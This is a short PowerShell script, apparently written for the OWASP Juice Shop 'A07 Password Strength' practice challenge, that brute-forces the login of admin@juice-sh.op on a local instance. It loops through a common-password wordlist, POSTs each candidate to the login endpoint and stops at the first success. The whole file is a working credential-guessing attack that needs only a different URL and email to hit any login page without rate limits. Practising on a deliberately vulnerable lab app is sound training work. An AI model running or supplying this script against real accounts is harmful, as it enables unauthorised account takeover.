# For the A07:Password Strength - challenge
#
# Depending on your system settings you may need to load this in VS Code and execute code as in-line
#

# Define the password list
# https://github.com/danielmiessler/SecLists
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt
# Bigger files on https://haveibeenpwned.com/Passwords

$passwords = Get-Content -Path best1050.txt

# Set the e-mail you want to breach
$email = "admin@juice-sh.op"

# Set your URL
# $uri = https://<your-gitpod-session>.gitpod.io/rest/user/login2       # Remember to unlock external ports exposure if your un in Gitpod
$uri = "http://localhost:3000/rest/user/login/"

foreach ($password in $passwords) {
    $postParams = @{ email=$email;password=$password }
    Write-Output "Testing $password"

    try { 
        Invoke-WebRequest -Uri $uri -Method POST -Body $postParams
        Write-Output "Valid"
        break
    }
    catch {
        # Verbose output of errors. Disable if you just want a message when it finds the valid password
        Write-Output "Failed: $_"
    }
}